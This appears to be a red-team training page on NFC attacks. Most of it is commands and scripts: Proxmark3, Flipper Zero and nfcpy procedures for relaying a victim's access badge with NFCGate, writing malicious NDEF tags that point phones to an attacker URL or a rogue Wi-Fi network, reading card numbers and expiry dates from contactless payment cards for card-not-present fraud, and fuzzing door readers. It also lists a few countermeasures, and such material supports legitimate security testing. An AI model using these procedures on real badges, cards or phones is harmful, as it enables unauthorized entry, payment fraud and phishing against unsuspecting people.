---
layout: training-page
title: "NFC Attacks — Red Team Academy"
module: "Wireless"
tags:
  - nfc
  - proxmark3
  - relay
  - emulation
  - ndef
  - nfcgate
  - contactless
page_key: "wireless-nfc-attacks"
render_with_liquid: false
---

# NFC Attacks

## Overview

Near Field Communication (NFC) operates at 13.56 MHz and is derived from ISO/IEC 14443 (contactless smart cards) and ISO/IEC 18092 (NFC peer-to-peer). At the application layer, NFC carries NDEF (NFC Data Exchange Format) messages, payment protocols (EMV contactless), transit card protocols, and access control applications.

The primary attack surfaces in physical red team engagements are: contactless access control cards (building entry), contactless payment cards (EMV), NFC-enabled mobile payments (Apple Pay, Google Pay), and NFC-enabled asset tags. The short range (typically <10cm) is the primary security assumption — relay attacks defeat this assumption by extending the effective range to arbitrary distances.

## Hardware Setup

```
# Proxmark3 RDV4 — primary NFC/RFID research tool:
# Flash latest Iceman firmware (most feature-complete):
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
make clean && make -j$(nproc) PLATFORM=PM3RDV4
# Flash via: ./pm3-flash-all
# Connect: ./proxmark3 /dev/ttyACM0
pm3 → help                              # Show all commands

# ACR122U — HF NFC reader (13.56 MHz), works with libnfc and nfc-tools:
apt install libnfc-dev libnfc-bin nfc-tools
nfc-list                                # Enumerate NFC devices
nfc-scan-device -v                      # Verbose device detection

# Flipper Zero — portable NFC + RFID:
# Menu: NFC → Read → place card → saved as .nfc file
# Emulate saved cards: NFC → Saved → select card → Emulate

# libnfc Python bindings:
pip install nfcpy                       # nfcpy — high-level Python NFC library
python3 -c "import nfc; clf = nfc.ContactlessFrontend('usb'); print(clf.device)"
```

## NFC Card Reading and Identification

```
# Proxmark3 — identify NFC card type:
pm3 → hf search                         # Auto-detect and identify NFC card
# Output shows: UID, ATQA, SAK, ATS → determines card type
# SAK 0x08 = MIFARE Classic 1K
# SAK 0x18 = MIFARE Classic 4K
# SAK 0x20 = MIFARE DESFire / ISO 14443-4 (e.g., HID iCLASS SE, DESFire)
# SAK 0x00 = MIFARE Ultralight
# SAK 0x28 = MIFARE Classic + ISO 14443-4

# Identify specific card:
pm3 → hf mf info                        # MIFARE Classic detailed info
pm3 → hf mfdes info                     # MIFARE DESFire info
pm3 → hf 14a info                       # ISO 14443-A full info

# Read NDEF from NFC tag (URI, text, vCard, etc.):
pm3 → hf mfu ndefread                   # MIFARE Ultralight NDEF
pm3 → hf 14b ndefread                   # ISO 14443-B NDEF

# nfcpy — Python NDEF read:
python3 - <<'EOF'
import nfc
import ndef

def on_connect(tag):
    print(f"Tag UID: {tag.identifier.hex()}")
    if tag.ndef:
        for record in tag.ndef.records:
            print(f"  Record type: {record.type}")
            print(f"  Data: {record}")

with nfc.ContactlessFrontend('usb') as clf:
    clf.connect(rdwr={'on-connect': on_connect})
EOF
```

## NFC Relay Attacks

Relay attacks are the most impactful NFC attack in physical engagements. They extend the effective range of an NFC card by relaying communication between the real card (held near a reader by a covert reader) and a fake card (placed on the target reader). The access control system sees a valid card; the card sees a valid reader. No card cloning or cryptography bypass is required.

```
# NFCGate — NFC relay over network (Android-based):
# https://github.com/nfcgate/nfcgate
# Architecture:
#   Device A (near real card)  ←→  NFCGate Server  ←→  Device B (at target reader)
# Device A: acts as NFC reader, reads the real card
# Device B: acts as NFC card (via HCE), presents data to the target reader
# All APDU communication relayed in real-time over the network (WiFi/mobile data)

# Setup:
# 1. Install NFCGate app on 2x Android phones (NFC required)
# 2. Configure server relay endpoint in app settings
# 3. Phone 1 (near victim's wallet/badge): Tap → Start reader session
# 4. Phone 2 (at target door reader): Tap reader → session relays through Phone 1

# Key consideration — relay attack timing:
# EMV contactless payments have a relay attack window (~1-2 seconds)
# Building access readers typically have longer timeouts (up to 5 seconds)
# Network latency + relay overhead must fit within the transaction timeout
# WiFi/LTE relay: typically adds 50-200ms — well within access control timeout
# Credit card payments: EMV may use relay detection (time-based) in some implementations

# Proxmark3 relay (PM3 as relay hardware):
# pm3 → hf 14a sniff                    # Sniff real card-reader exchange
# Then replay/relay using: hf 14a sim with captured data

# Physical operation (two-person team):
# Attacker 1: approaches target employee, holds phone near their access badge wallet
# Attacker 2: positioned at target door, touches phone to reader
# NFCGate relays: door grants access

# Relay detection and countermeasures:
# Distance bounding protocols (ISO/IEC 29167-5) — not widely deployed
# NFC CSRF / Transaction Authentication Number — app-layer mitigation
# EMV timed relay detection (EMV 2.10+) — measures round-trip time
# Faraday wallet/case — physical shielding (prevents relay at source)
```

## NDEF Injection Attacks

NDEF tags store formatted data read by NFC-enabled phones and apps. Malicious NDEF payloads can trigger URI opens, app launches, Bluetooth pairing, and Wi-Fi configuration. Effective for social engineering in physical environments.

```
# NDEF record types:
# URI record (U) — opens URL when tag is scanned
# Text record (T) — display text
# SmartPoster — URI + metadata
# Android Application Record (AAR) — open specific Android app
# BT Handover (Hs) — initiate Bluetooth pairing
# Wi-Fi Simple Configuration (WSC) — configure Wi-Fi automatically

# Write malicious URI NDEF (opens attacker URL on phone scan):
pm3 → hf mf ndef -d NdefUri -p "https://attacker.com/payload"
# Tag placed near NFC-enabled device → phone auto-opens URL

# Write Android Application Record (deep link into app):
pm3 → hf mfu ndefwrite -d "D1010B55036578616D706C652E636F6D"
# Forces target app to open → trigger app vulnerability or phishing flow

# Wi-Fi credential injection via NDEF:
# Write Wi-Fi Simple Configuration record that configures Wi-Fi on scan:
# Format: WFA WSC record with SSID + credentials
# Android reads WSC record and auto-prompts Wi-Fi join (often auto-accepts)
python3 - <<'EOF'
import nfc
import ndef

# Create Wi-Fi handover record (simplified example):
wsc_record = ndef.WifiSimpleConfigRecord()
wsc_record.network_name = "EvilHotspot"
wsc_record.network_key = "password123"
wsc_record.auth_type = ndef.WifiSimpleConfigRecord.AUTH_WPA2_PERSONAL

tag_data = [wsc_record]
with nfc.ContactlessFrontend('usb') as clf:
    tag = clf.connect(rdwr={})
    if tag.ndef:
        tag.ndef.records = tag_data
        print("NDEF written")
EOF

# Bluetooth Handover (pair attacker BT device on scan):
# NDEF Bluetooth Handover Select record → phone initiates pairing
# Combined with BIAS/BLESA for post-pair attacks

# NFC phishing (physical):
# Replace legitimate NFC marketing tags with malicious ones
# Hotel key card readers, restaurant menus, museum exhibits, product packaging
# Phone scans tag → opens convincing phishing page for credentials
```

## Contactless EMV Card Skimming

Contactless EMV cards broadcast limited card data during the initial Application Data scan — this includes the card number and expiry date in many implementations. While full EMV transactions are cryptographically protected, the initial data is retrievable without authentication.

```
# Read EMV card data without authorization:
pm3 → emv search -1                    # Auto-detect EMV application
pm3 → emv reader -1                    # Full EMV reader session

# ISO 14443-A SELECT commands to EMV application:
pm3 → hf 14a apdu -s -d 00A404000E325041592E5359532E444446303100
# SELECT Payment Systems Environment (PSE)
# Response contains list of payment applications on card

pm3 → hf 14a apdu -s -d 00A4040007A0000000031010
# SELECT Visa application
# Response: FCI with PDOL (Processing Data Object List)

# Read card number (PAN) and expiry:
pm3 → hf 14a apdu -d 80A800002300000000000000000000000000000000000000000000000000000000000000
# GPO — Get Processing Options
# Response may include: AIP (Application Interchange Profile), AFL (Application File Locator)

pm3 → hf 14a apdu -d 00B2010C00
# READ RECORD — read EMV records containing PAN, expiry, cardholder name

# What contactless EMV exposes (pre-transaction, no PIN):
# PAN (card number): YES — exposed in plaintext in transaction record
# Expiry date: YES — in plaintext
# Cardholder name: sometimes (Visa typically yes, Mastercard sometimes)
# Track 2 equivalent data: YES in some older implementations
# CVV2: NO — never stored on chip
# CVV1 / iCVV: iCVV changes per transaction — not the CVV2 on back of card
# Transaction history: sometimes (last 10 transactions in ARQC log)

# PAN + expiry → usable for CNP (Card Not Present) fraud in some online merchants
# Note: many merchants now require CVV2 → limits fraud potential
# But: some older/less secure merchants still process without CVV2

# Covert NFC skimmer hardware:
# Modified NFC reader boards integrated into realistic objects
# Typical read range: 1-3cm through wallet/pocket
# Long-range covert readers: up to 10cm with field-shaping antenna design
```

## Fuzzing NFC Readers

NFC reader software (embedded firmware in access control units) may contain parsing vulnerabilities when handling malformed card data. Fuzzing with malformed APDU responses can trigger crashes, privilege escalation, or authentication bypass.

```
# Proxmark3 as NFC card emulator (send arbitrary APDUs from "card" side):
pm3 → hf 14a sim -t 1                  # Simulate generic ISO 14443-A card
# Then send custom APDUs as the card responding to reader commands

# Custom emulation script (Proxmark3 Lua scripting):
pm3 → script run hf_14a_reader

# Proxmark3 standalone fuzzing (using scripted APDU responses):
# The reader sends SELECT command → you respond with malformed data
# Test: oversized UID (standard is 4-7 bytes; send 32 bytes)
# Test: malformed ATS (Answer to Select)
# Test: unexpected status codes in SELECT response

# nfcpy-based fuzzer:
python3 - <<'EOF'
import nfc
import struct
import random

class FuzzTarget:
    def on_startup(self, targets):
        # Return fuzzed tag type 2 target
        target = nfc.clf.LocalTarget("106A")
        # Fuzz the ATQA response (2 bytes):
        target.sens_res = struct.pack('BB', random.randint(0,255), random.randint(0,255))
        # Fuzz the SAK:
        target.sel_res = struct.pack('B', random.randint(0,255))
        target.sdd_res = b'\x01\x02\x03\x04'  # UID
        return [target]

    def on_connect(self, tag):
        return True  # Keep connection alive for further fuzzing

with nfc.ContactlessFrontend('usb') as clf:
    clf.connect(card=FuzzTarget())
EOF

# Test oversized NDEF content (buffer overflow in NDEF parsers):
# Many cheap NFC readers have fixed-size NDEF parsers
# Sending 4KB NDEF record to a 256-byte reader buffer → potential overflow

# Fuzzing access control readers:
# Target: door entry readers (HID Omnikey, Allegion, Bosch)
# These run embedded firmware that parses card data to extract Wiegand bits
# Malformed UID or oversized card response may crash or bypass auth
# Test: reader sends RATS → you respond with oversized ATS + malformed FSDI
```

## NFC Host Card Emulation (HCE) Attacks

Host Card Emulation allows Android apps to emulate NFC smart cards at the application layer, without a Secure Element. This is used by mobile payment apps and enterprise badge apps. HCE implementations may have vulnerabilities at the app level.

```
# HCE attack surface:
# Android apps implementing HCE define: AID (Application ID) + APDU handler
# AID must match what the reader sends in SELECT command
# App processes APDUs in software — logic bugs possible

# Enumerate HCE apps on Android device (requires ADB access or reverse engineering):
adb shell pm list packages | xargs -I{} adb shell pm dump {} | grep -l "HCE\|NfcHce"
# Check AndroidManifest.xml for: android.nfc.cardemulation.action.HOST_APDU_SERVICE

# Extract AID registrations (requires app decompile or dumpsys):
adb shell dumpsys nfc | grep -A5 "AID"

# Replay captured APDU exchange:
# 1. Capture real transaction (NFCGate or Proxmark3 sniff mode)
# 2. Replay exact APDUs to NFC reader using Proxmark3 emulation
pm3 → hf 14a sim -t 4                  # ISO 14443-4 emulation
# Then inject captured APDUs via pm3 command shell

# HCE mobile payment replay limitations:
# EMV contactless: each transaction has cryptographic counter (ATC)
# ARQC (Authorization Request Cryptogram) uses session key — changes every txn
# Simple replay blocked by counter check at payment processor
# BUT: some transit systems (subway, bus) implement simpler auth → replay may work
```
